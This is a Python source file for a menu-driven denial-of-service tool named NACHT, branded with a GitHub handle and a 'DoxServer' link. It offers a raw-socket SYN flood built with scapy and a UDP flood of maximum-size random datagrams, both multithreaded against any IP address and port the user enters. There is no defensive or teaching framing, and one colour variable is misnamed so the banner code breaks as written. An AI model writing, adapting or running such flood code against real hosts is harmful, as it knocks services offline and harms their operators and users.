import os
import sys
import socket
import random
import threading
import time
from scapy.all import IP, TCP

nachtnacht = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{nacht}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝{clear}
               
╔═════════════════════════════════════════════════════╗
║ {nacht}*{clear} Github    {nacht}:{clear}   https://github.com/madanokr001      ║
║ {nacht}*{clear} DoxServer {nacht}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {nacht}*{clear} version   {nacht}:{clear}   4.0                                 ║
║ {nacht}*{clear} NACHT      {nacht}:{clear}   {nacht}[{clear}{white}LAYER4{clear}{nacht}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {nacht}[{clear}1{nacht}]{clear} SYN Flood Attack                                ║
║ {nacht}[{clear}2{nacht}]{clear} UDP Flood Attack                                ║                       
║ {nacht}[{clear}3{nacht}]{clear} Exit NACHT                                       ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer4():
    while True:
        logo()
        select = input(f"""
╔═══[{nacht}root{clear}@{nacht}NACHT{clear}]
╚══{nacht}>{clear} """)
                                        
        if select == "1" or select.lower() == "s":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                    while True:
                        sport = random.randint(1024, 65535)
                        seq = random.randint(0, 4294967295)

                        ip_header = IP(dst=target)
                        tcp_header = TCP(sport=sport, dport=port, flags='S', seq=seq)

                        packet = bytes(ip_header / tcp_header)
                        print(f"[{nacht}NACHT{clear}] IP Address {nacht}:{clear} {target} {nacht}|{clear} SYN Packet {white}:{clear} {nacht}{ip_header / tcp_header}{clear}")
                        s.sendto(packet, (target, port)) 

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Download {nacht}>{clear} https://npcap.com/#download")
                    time.sleep(3)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)
                    
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nacht}NACHT{clear}] IP       {nacht}>{clear} ")
            port = int(input(f"[{nacht}NACHT{clear}] PORT       {nacht}>{clear} "))
            threads = int(input(f"[{nacht}NACHT{clear}] THREAD       {nacht}>{clear} "))
            start_threads(target, port, threads)


        elif select == "2" or select.lower() == "u":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    while True:
                        sport = random.randint(1024, 65535)  
                        data = random.randbytes(65507)  

                        s.sendto(data, (target, port))

                        print(f"[{nacht}NACHT{clear}] IP Address {nacht}:{clear} {target} {nacht}|{clear} UDP Packet {nacht}:{clear} {white}65507{clear}")

                except Exception as e:
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(3)
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nacht}NACHT{clear}] IP       {nacht}>{clear} ")
            port = int(input(f"[{nacht}NACHT{clear}] PORT       {nacht}>{clear} "))
            threads = int(input(f"[{nacht}NACHT{clear}] THREAD       {nacht}>{clear} "))
            start_threads(target, port, threads)

        elif select == "3" or select.lower() == "e":
            sys.exit()


if __name__ == "__main__":
    layer4()

